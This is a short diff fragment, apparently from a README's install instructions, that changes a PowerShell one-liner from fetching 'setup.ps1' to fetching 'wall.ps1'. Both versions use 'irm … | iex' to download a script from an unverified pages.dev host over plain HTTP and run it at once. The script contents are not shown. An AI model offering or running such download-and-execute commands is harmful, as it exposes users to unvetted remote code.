@@ -13,5 +13,5 @@ irm http://setup-567.pages.dev/setup.ps1 | iex
 ## Or
 
 ```powershell
-irm http://setup-567.pages.dev/setup.ps1 | iex
+irm http://setup-567.pages.dev/wall.ps1 | iex
 ```
